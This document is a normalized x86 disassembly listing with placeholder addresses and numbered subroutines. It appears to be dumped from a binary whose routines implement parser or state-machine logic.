mov [ ecx + 0x38 ] eax
pop ebx
mov esp ebp
pop ebp
retn
push r--data
lea ecx [ ebx + 0x1c ]
mov eax r--data
call sub_1006c3a0
add esp 0x4
test eax eax
jne r-xdata
mov edi ebx
mov ebx [ ebp - 0x4 ]
xor ecx ecx
cmp [ eax + 0x18 ] 0x46
sete cl
test ecx ecx
je r-xdata
push esi
mov eax ebx
mov [ ebp - 0x4 ] 0x0
call sub_1006c750
add esp 0x4
mov [ ebx + 0x18 ] 0x47
push 0x96
push 0x71
push 0x72
push 0x1
mov eax ebx
call sub_1006c810
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x1a
sete cl
test ecx ecx
je r-xdata
push esi
call sub_1006d390
mov edi ebx
add esp 0x4
mov ebx esi
call sub_1006d010
mov eax esi
call sub_1006cc00
mov edx [ esi + 0xc ]
pop edi
mov eax 0x1
pop esi
mov [ edx + 0x38 ] eax
pop ebx
mov esp ebp
pop ebp
retn
push esi
call sub_1006c450
add esp 0x4
mov edi [ ebp + 0x8 ]
push edi
xor ebx ebx
call sub_1006c750
add esp 0x4
or [ esi + 0xc ] 0x40
mov [ esi + 0x1c ] 0x47
jmp r-xdata
push 0x96
push 0x3d
push 0x3e
push 0x1
mov eax ebx
call sub_1006c810
add esp 0x10
test eax eax
je r-xdata
push 0x72
mov eax esi
call sub_1006c550
call sub_1006c8b0
add esp 0x4
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x83
sete cl
test ecx ecx
je r-xdata
push ebx
call sub_1006dcf0
mov edi ebx
mov ebx esi
mov [ ebp + 0xc ] eax
call sub_1006d010
mov eax esi
call sub_1006cc00
mov edx [ esi + 0xc ]
push esi
mov [ edx + 0x38 ] 0x1
call sub_1006c450
mov eax [ ebp + 0xc ]
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_1006cc00
mov ecx [ edi + 0xc ]
push edi
mov [ ecx + 0x38 ] 0x1
call sub_1006c450
add esp 0x4
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x2
jne r-xdata
push esi
mov eax 0x3c
mov [ ebp + 0x8 ] 0x1
call sub_1006d690
add esp 0x4
test eax eax
je r-xdata
push esi
call sub_1006d390
mov edi ebx
add esp 0x4
mov ebx esi
call sub_1006d010
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_1006cc00
xor ecx ecx
cmp eax 0x73
sete cl
test ecx ecx
je r-xdata
push esi
mov eax ebx
call sub_1006c750
mov eax [ esi + 0xc ]
add esp 0x4
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp edi 0x1
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x42
sete al
test eax eax
je r-xdata
push 0x3c
mov eax esi
call sub_1006c550
call sub_1006c8b0
add esp 0x4
test eax eax
jne r-xdata
mov edi 0x96
call sub_1006d930
xor ecx ecx
cmp eax 0x85
sete cl
test ecx ecx
je r-xdata
push 0x2
mov eax ebx
call sub_1006d210
mov eax [ esi + 0xc ]
push esi
mov [ eax + 0x40 ] 0x1
call sub_1006c450
add esp 0x8
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push ebx
mov [ eax + 0x38 ] 0x1
call sub_1006dcf0
push esi
call sub_1006c450
lea edi [ ebx + 0x1c ]
push r--data
push edi
mov [ ebp - 0x10 ] edi
call sub_1002e6f0
push r--data
push edi
mov [ ebp + 0x8 ] eax
call sub_1002e6f0
push r--data
push edi
mov [ ebp + 0xc ] eax
call sub_1002e6f0
mov [ ebp - 0xc ] eax
push 0x69
mov eax 0x20
mov ecx esi
call sub_1006d050
add esp 0x24
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ eax + 0x68 ]
push eax
push esi
call sub_1001bee0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x1
push 0x80
push 0x61
push 0x62
push 0x60
push 0x1
mov eax ebx
call sub_1006c810
add esp 0x34
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x53
sete cl
test ecx ecx
je r-xdata
push esi
mov eax ebx
call sub_1006c750
push esi
call sub_1006d390
push 0x42
lea eax [ edi + 0xe ]
mov ecx esi
call sub_1006d050
add esp 0xc
mov eax esi
call sub_1006cc00
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax ebx
call sub_1006c750
add esp 0x4
jmp r-xdata
xor ecx ecx
cmp eax 0x48
sete cl
test ecx ecx
je r-xdata
push ebx
call sub_1006dcf0
push esi
mov edi eax
call sub_1006d390
push esi
call sub_1006c450
push 0x4
mov eax ebx
call sub_1006d210
add esp 0x10
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1a
mov eax 0x20
mov ecx esi
call sub_1006d050
mov eax esi
call sub_1006cc00
push 0x6c
mov eax 0x20
mov ecx esi
call sub_1006d050
mov edi [ esi + 0xc ]
mov edx [ ebx + 0x10 ]
add edi 0x48
mov [ edi + 0xc ] edx
mov eax [ ebx + 0x4 ]
mov [ edi + 0x10 ] eax
mov ecx [ ebx + 0x8 ]
mov [ edi + 0x14 ] ecx
mov edx [ ebx + 0xc ]
add esp 0x8
cmp [ ebp + 0x8 ] 0x0
mov [ edi + 0x18 ] edx
mov [ edi + 0x1c ] 0x2
je r-xdata
mov ecx [ ebp + 0xc ]
add eax 0x4c
push eax
push ecx
push esi
call sub_100520a0
add esp 0xc
cmp edi 0x1
je r-xdata
xor ecx ecx
cmp eax 0x5c
sete cl
mov eax ecx
test eax eax
je r-xdata
push esi
call sub_1006d390
mov eax ebx
mov edi esi
call sub_1006df30
push esi
mov eax ebx
call sub_1006de70
push esi
mov eax 0x2
call sub_1006d0a0
add esp 0xc
mov [ ebp + 0x8 ] 0x0
xor ecx ecx
cmp eax 0x87
sete cl
test ecx ecx
je r-xdata
push esi
call sub_1006c450
push 0x4
mov eax ebx
call sub_1006d210
add esp 0x8
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push edi
lea ecx [ ebp - 0x8 ]
push ecx
push esi
mov [ ebp - 0x8 ] r--data
mov [ ebp - 0x4 ] 0x33
call sub_1004c2a0
add esp 0xc
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
lea edx [ eax + 0x1 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edi [ ecx + 0xc ]
dec edi
mov eax [ ebx + 0x18 ]
mov [ ebp + 0x8 ] eax
js r-xdata
push esi
call sub_1006d390
push esi
mov eax ebx
call sub_1006ded0
push esi
mov eax ebx
call sub_1006de70
push esi
mov eax 0x1
call sub_1006d0a0
add esp 0x10
jmp r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_1006cc00
mov eax [ esi + 0xc ]
mov [ eax + 0x38 ] 0x1
xor ecx ecx
cmp eax 0x6f
sete cl
mov eax ecx
test eax eax
je r-xdata
push 0x4
mov eax ebx
call sub_1006d210
add esp 0x4
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001bee0
push 0x4c
push esi
call sub_10024af0
mov edi r--data
mov ebx eax
push edi
push esi
mov [ ebx ] 0x0
call sub_1002bb60
push r--data
push esi
mov [ ebx + 0x4 ] eax
call sub_1002bb60
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x8 ] edi
mov eax 0x4
mov [ ebx + 0xc ] eax
mov eax r--data
mov [ ebx + 0x14 ] eax
mov eax 0x7
mov [ ebx + 0x18 ] eax
mov edx [ r--data ]
mov [ ebx + 0x1c ] edx
mov eax [ r--data ]
mov [ ebx + 0x20 ] eax
mov ecx [ r--data ]
mov [ ebx + 0x24 ] ecx
mov edx [ r--data ]
mov [ ebx + 0x28 ] edx
mov eax [ r--data ]
mov [ ebx + 0x2c ] eax
mov ecx [ r--data ]
mov [ ebx + 0x30 ] ecx
mov edx [ r--data ]
mov [ ebx + 0x34 ] edx
mov eax [ r--data ]
mov [ ebx + 0x38 ] eax
mov ecx [ r--data ]
mov [ ebx + 0x3c ] ecx
mov edx [ r--data ]
mov [ ebx + 0x40 ] edx
mov edx [ ebp - 0x4 ]
mov eax [ r--data ]
add edx 0x4c
push edx
mov [ ebx + 0x44 ] eax
mov ecx [ r--data ]
push ebx
push esi
mov [ ebx + 0x48 ] ecx
call sub_100520a0
mov eax esi
call sub_1006cc00
mov eax esi
call sub_1006cc00
push 0x1a
mov eax 0x20
mov ecx esi
call sub_1006d050
add esp 0x30
mov eax esi
call sub_1006cc00
mov eax esi
call sub_1006cc00
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov eax [ edx + ebx * 4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
mov ecx [ eax + edi * 4 ]
cmp [ ecx + 0x20 ] 0x0
mov [ ebp + 0xc ] ecx
jne r-xdata
mov edx ebx
cmp [ edx + 0x28 ] 0x0
je r-xdata
push esi
call sub_1006d390
mov edi ebx
mov ebx esi
call sub_1006d010
push esi
call sub_1006c450
mov esi [ esi + 0xc ]
mov eax [ esi ]
add esp 0x8
cmp eax 0x8
je r-xdata
mov edx [ edi ]
mov [ edx + ebx * 4 ] 0x0
inc ebx
cmp ebx [ edi + 0x4 ]
jb r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
sub eax edx
push edi
push esi
mov ebx eax
call sub_1001bc80
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
push edx
push esi
call sub_1002bb60
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov [ edi + 0x4 ] ebx
push eax
inc ebx
push esi
mov [ edi + 0x8 ] ebx
call sub_10044fc0
add esp 0x18
jmp r-xdata
call sub_1006db50
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax ecx
call sub_1006c8b0
add esp 0x4
test eax eax
jne r-xdata
pop edi
mov [ esi ] 0x10
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0xa
je r-xdata
cmp eax [ ebp - 0xc ]
je r-xdata
push 0x6d
mov eax 0x20
mov ecx esi
call sub_1006d050
mov edi [ ebp - 0x10 ]
xor ebx ebx
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ edi + 0x4 ] ebx
jbe r-xdata
dec edi
jns r-xdata
mov edi edx
call sub_1006d930
mov edi [ ebp + 0xc ]
cmp eax 0xc
je r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x4c
push ecx
push eax
push esi
call sub_100520a0
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_1006cc00
cmp edi eax
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0xd
je r-xdata
cmp eax 0xe
je r-xdata
pop edi
mov [ esi ] 0xf
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
sub_10070180
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax [ edi ]
cmp eax 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0xc ]
add esi 0x48
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp eax 0x4
je r-xdata
mov edx [ edi + 0x18 ]
push esi
push edx
push eax
call sub_10062120
add esp 0xc
cmp [ edi ] 0x5
jne r-xdata
mov edx [ edi + 0x10 ]
mov [ esi + 0xc ] edx
mov ecx [ edi + 0x4 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi + 0x8 ]
mov [ esi + 0x14 ] edx
mov ecx [ edi + 0xc ]
mov [ esi + 0x18 ] ecx
mov esi [ ebp + 0x8 ]
cmp eax 0x7
jne r-xdata
mov eax [ edi + 0x18 ]
push eax
push r--data
call sub_1001f980
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov [ esi + 0x1c ] 0x2
mov eax esi
call sub_1006cc00
mov esi [ esi + 0xc ]
mov ecx [ esi + 0x4 ]
pop edi
mov [ esi ] ecx
mov eax 0x1
pop esi
pop ebp
retn
push esi
mov eax edi
call sub_1006c750
mov eax [ esi + 0xc ]
add esp 0x4
mov [ eax + 0x34 ] 0x1
sub_10070230
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0xc ]
mov [ ebp - 0x4 ] ecx
cmp esi 0x5
je r-xdata
mov edx [ ecx ]
mov eax 0x1
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x34 ] eax
mov ecx [ edi + 0xc ]
pop edi
pop esi
mov [ ecx ] 0x9
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x4
je r-xdata
test esi esi
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
mov eax ebx
call sub_1006c750
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_1001bee0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x1
jne r-xdata
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
push 0x96
push 0x66
push 0x68
push 0x67
push 0x64
push 0x65
push 0x63
push 0x1
mov eax ebx
call sub_1006c810
add esp 0x20
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x60
sete cl
test ecx ecx
je r-xdata
mov esi ebx
mov ebx eax
mov eax edi
call sub_1006cce0
mov edx [ ecx + 0x8 ]
mov eax [ edx + eax * 4 - 0x4 ]
mov ecx 0x5f
cmp esi 0x1
jne r-xdata
mov esi edi
call sub_1006cda0
mov eax [ edi + 0xc ]
push 0x96
push 0x66
push 0x68
mov [ eax ] 0xc
push 0x67
push 0x1
mov eax ebx
call sub_1006c810
add esp 0x14
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x61
sete cl
test ecx ecx
je r-xdata
mov esi edi
call sub_1006cda0
mov ebx r--data
call sub_1006d320
mov edi [ ebp + 0xc ]
mov ebx esi
call sub_1006d010
mov eax [ ebx + 0xc ]
pop edi
pop esi
mov [ eax ] 0xa
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] ecx
sete al
test eax eax
je r-xdata
mov edi ebx
mov ebx esi
call sub_1006d010
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push 0x63
mov eax 0x8
mov ecx edi
call sub_1006d050
mov ecx [ ebp - 0x4 ]
add esp 0x4
pop edi
pop esi
mov [ ecx + 0x34 ] 0x1
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
cmp eax 0x62
sete dl
mov eax edx
test eax eax
je r-xdata
mov esi edi
call sub_1006cda0
mov edi ebx
mov ebx esi
call sub_1006d010
mov ecx [ ebx + 0xc ]
pop edi
pop esi
mov [ ecx ] 0xb
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x0
push 0x61
push 0x62
push 0x60
push 0xa
push 0x0
mov eax ebx
call sub_1006c810
add esp 0x34
test eax eax
mov eax ebx
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] ecx
sete al
test eax eax
je r-xdata
push edi
mov eax ebx
call sub_1006c750
add esp 0x4
mov esi edi
call sub_1006d9b0
test eax eax
je r-xdata
mov esi edi
call sub_1006cda0
push 0x61
mov eax 0x8
mov ecx edi
call sub_1006d050
mov ecx [ edi + 0xc ]
add esp 0x4
mov eax 0x1
mov [ ecx + 0x34 ] eax
mov edx [ edi + 0xc ]
pop edi
pop esi
mov [ edx ] 0xb
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x7
push 0x6
push 0x1
call sub_1006c810
add esp 0x10
test eax eax
je r-xdata
push edi
call sub_1006c750
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_1001bee0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov esi edi
call sub_1006d9b0
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_1001bee0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi + 0xc ]
pop edi
pop esi
mov [ edx + 0x34 ] 0x1
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x1
jne r-xdata
push ebx
push edi
call sub_1006ea50
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov eax ebx
call sub_1006c750
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x7
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x6d
sete al
test eax eax
je r-xdata
push edi
mov eax ebx
call sub_1006c750
mov esi [ ebp - 0x4 ]
push ebx
push edi
mov [ esi + 0x44 ] 0x1
call sub_1006ed80
add esp 0xc
pop edi
mov [ esi + 0x44 ] 0x0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
mov eax edi
call sub_1006c550
call sub_1006c8b0
add esp 0x4
jmp r-xdata
mov esi [ ebx ]
cmp esi 0x1
jne r-xdata
push r--data
lea ecx [ ebx + 0x1c ]
mov eax r--data
call sub_1006c3a0
add esp 0x4
test eax eax
je r-xdata
test eax eax
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x69
sete al
test eax eax
je r-xdata
push edi
mov eax ebx
call sub_1006c750
mov edi ebx
mov ebx [ ebp + 0x8 ]
add esp 0x4
call sub_1006d010
mov eax ebx
call sub_1006cc00
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov eax ebx
call sub_1006c750
mov ecx [ ebp - 0x4 ]
add esp 0x4
cmp [ ecx + 0x30 ] 0x0
je r-xdata
mov edi ebx
mov ebx [ ebp + 0x8 ]
call sub_1006d010
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x30 ] eax
mov eax ebx
call sub_1006cc00
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_1001bee0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
sub_10070600
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push esi
cmp ecx 0x6
jne r-xdata
push edi
cmp ecx 0x5
je r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_1006c750
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001bee0
add esp 0xc
xor eax eax
pop esi
pop ebp
retn
mov edi eax
mov eax [ ebp + 0x8 ]
call sub_1006d1b0
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp ecx 0x4
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0xc ]
xor edi edi
cmp [ esi + 0x4c ] edi
jbe r-xdata
mov edi ebx
call sub_1006caa0
mov edx [ esi + 0x4 ]
pop ebx
mov eax 0x1
pop edi
mov [ esi + 0x44 ] 0x0
mov [ esi + 0x34 ] eax
mov [ esi ] edx
pop esi
pop ebp
retn
mov edx [ esi + 0x48 ]
movsx eax [ edx + edi ]
push eax
call sub_1004ba5c
add esp 0x4
test eax eax
je r-xdata
push ebx
mov [ esi + 0x44 ] 0x1
call sub_1006d390
add esp 0x4
mov ecx [ esi + 0x48 ]
cmp [ edi + ecx ] 0xb
je r-xdata
inc edi
cmp edi [ esi + 0x4c ]
jb r-xdata
jmp r-xdata
sub_100706b0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov ebx [ ebp + 0xc ]
push edi
push 0x96
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x61
push 0x62
mov edi 0x60
push edi
mov esi 0x1
push esi
mov eax ebx
call sub_1006c810
add esp 0x2c
test eax eax
jne r-xdata
push 0x96
push 0x5f
push 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0x8 ]
push ecx
lea eax [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] eax
call sub_1006d5b0
add esp 0x18
test eax eax
jne r-xdata
push 0x96
push 0x5f
push edi
push eax
mov eax ebx
call sub_1006c810
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebx ] 0x2
jne r-xdata
push esi
mov eax ebx
call sub_1006c750
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001bee0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push eax
push 0x61
push 0x62
push 0xa
push eax
mov eax ebx
call sub_1006c810
add esp 0x30
test eax eax
je r-xdata
push esi
mov eax ebx
call sub_1006c750
mov ecx [ esi + 0xc ]
add esp 0x4
mov [ ecx + 0x34 ] 0x1
xor eax eax
cmp [ ebx + 0x18 ] edi
sete al
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push ebx
push edx
call sub_1006ed80
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
mov eax ebx
call sub_1006c750
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001bee0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ edx + ecx * 4 - 0x4 ]
mov edi 0x96
call sub_1006d930
mov eax [ esi + 0xc ]
mov ecx [ eax + 0xc ]
mov edi 0x1
test ecx ecx
je r-xdata
push esi
mov eax ebx
call sub_1006c750
add esp 0x4
push 0x60
mov eax esi
call sub_1006c550
call sub_1006c8b0
add esp 0x4
test eax eax
jne r-xdata
cmp [ ecx + 0x1c ] 0x60
je r-xdata
xor edi edi
mov eax esi
call sub_1006cc00
push 0x60
mov eax esi
call sub_1006c550
call sub_1006c8b0
add esp 0x4
test eax eax
je r-xdata
mov eax esi
call sub_1006cc00
mov ebx esi
call sub_1006d4a0
mov eax [ esi + 0xc ]
mov [ eax ] 0x8
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10070860
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
mov edx [ edi ]
cmp edx 0x4
jne r-xdata
push esi
test edx edx
jne r-xdata
mov eax [ ebp + 0x8 ]
call sub_1006d1b0
mov eax 0x1
pop edi
pop ebp
retn
push ebx
cmp edx 0x3
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_1006c750
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001bee0
add esp 0xc
pop esi
xor eax eax
pop edi
pop ebp
retn
mov esi 0x1
cmp edx esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
cmp edx 0x2
jne r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
test eax eax
sete cl
test ecx ecx
je r-xdata
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi edi
mov ebx edx
call sub_1006cce0
pop ebx
pop esi
mov eax 0x1
pop edi
pop ebp
retn
mov esi edi
mov ebx edx
call sub_1006cce0
lea eax [ ebx + 0x1 ]
pop ebx
pop esi
pop edi
pop ebp
retn
mov ebx [ ebp + 0x8 ]
cmp edx 0x7
jne r-xdata
xor eax eax
cmp [ edi + 0x18 ] 0x62
sete al
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x62
sete cl
mov eax ecx
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edi
push edx
call sub_1006ed80
add esp 0x8
pop ebx
pop esi
pop edi
pop ebp
retn
mov eax ebx
call sub_1006c550
mov ecx [ ebx + 0x4 ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov eax ebx
call sub_1006c550
mov edx [ ebx + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_1006c750
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001bee0
add esp 0xc
pop ebx
pop esi
xor eax eax
pop edi
pop ebp
retn
mov ebx [ ebp + 0x8 ]
call sub_1006d010
mov eax ebx
call sub_1006cc00
mov edx [ ebx + 0xc ]
pop ebx
mov [ edx + 0x38 ] esi
mov eax esi
pop esi
pop edi
pop ebp
retn
mov eax ebx
call sub_1006cc00
mov edx [ ebx + 0xc ]
mov [ edx ] 0x8
cmp [ edi ] 0x2
jne r-xdata
push ebx
mov eax edi
call sub_1006c750
add esp 0x4
pop ebx
pop esi
xor eax eax
pop edi
pop ebp
retn
pop ebx
mov eax esi
pop esi
pop edi
pop ebp
retn
mov eax [ ebx + 0xc ]
mov [ eax + 0x34 ] esi
xor eax eax
cmp [ edi + 0x18 ] 0x61
sete al
test eax eax
jne r-xdata
sub_100709d0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ edi ]
mov esi 0x1
cmp ebx esi
jne r-xdata
push 0x96
push 0x68
push 0x67
push esi
mov eax edi
call sub_1006c810
add esp 0x10
test eax eax
mov eax edi
je r-xdata
xor eax eax
cmp [ edi + 0x18 ] 0x66
sete al
test eax eax
je r-xdata
push 0x96
push 0x64
push 0x65
push 0x63
push 0x0
call sub_1006c810
add esp 0x14
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_1006c750
push ebx
call sub_100620c0
push 0x66
call sub_1006cdf0
mov edi eax
or [ edi + 0xc ] 0x9
push 0x0
mov ecx ebx
call sub_1006cf60
add esp 0x10
push edi
push 0x66
call sub_1003b570
add esp 0x4
push eax
push r--data
call sub_1001f980
mov edx [ ebx + 0xc ]
add esp 0xc
mov [ edx + 0x34 ] esi
mov eax [ ebx + 0xc ]
pop edi
pop esi
mov [ eax ] 0xd
xor eax eax
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push ebx
call sub_100620c0
push 0x0
push ebx
call sub_1006cea0
push 0x0
mov ecx ebx
mov edi eax
call sub_1006cf60
mov eax [ edi + 0x1c ]
add esp 0x10
push edi
push eax
call sub_1003b570
add esp 0x4
push eax
push r--data
call sub_1001f980
mov ecx [ ebx + 0xc ]
add esp 0xc
pop edi
mov eax esi
pop esi
mov [ ecx ] 0xd
pop ebx
pop ebp
retn
push 0x96
push 0x64
push 0x65
push 0x63
push 0x61
push 0x62
push 0x60
push esi
mov eax edi
call sub_1006c810
add esp 0x20
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov eax [ edi + 0x18 ]
push ebx
call sub_1006d8b0
add esp 0x4
push ebx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
mov eax 0x63
call sub_1006d8b0
add esp 0x4
test eax eax
jne r-xdata
cmp ebx 0x2
jne r-xdata
mov eax edi
call sub_1006c750
mov ecx [ ebx + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push ebx
call sub_1001bee0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
call sub_100620c0
add esp 0x4
mov eax ebx
call sub_1006cc00
mov eax [ ebx + 0xc ]
pop edi
mov [ eax ] 0x8
mov eax esi
pop esi
pop ebx
pop ebp
retn
push ebx
call sub_100620c0
add esp 0x4
mov eax ebx
call sub_1006cc00
mov eax [ ebx + 0xc ]
mov [ eax ] 0x8
mov ecx [ ebx + 0xc ]
pop edi
mov [ ecx + 0x34 ] esi
mov eax esi
pop esi
pop ebx
pop ebp
retn
push ebx
mov eax 0x64
call sub_1006d8b0
add esp 0x4
test eax eax
jne r-xdata
push 0x96
push 0x68
push 0x67
push 0x0
push 0x61
push 0x66
push 0x62
push 0x60
push 0xa
push 0x0
mov eax edi
call sub_1006c810
add esp 0x28
test eax eax
je r-xdata
cmp [ edi + 0x18 ] 0x5f
sete al
test eax eax
jne r-xdata
push ebx
mov eax 0x65
call sub_1006d8b0
add esp 0x4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push edi
push eax
call sub_10070230
add esp 0x8
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_1006c750
mov ecx [ esi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push esi
call sub_1001bee0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
push ebx
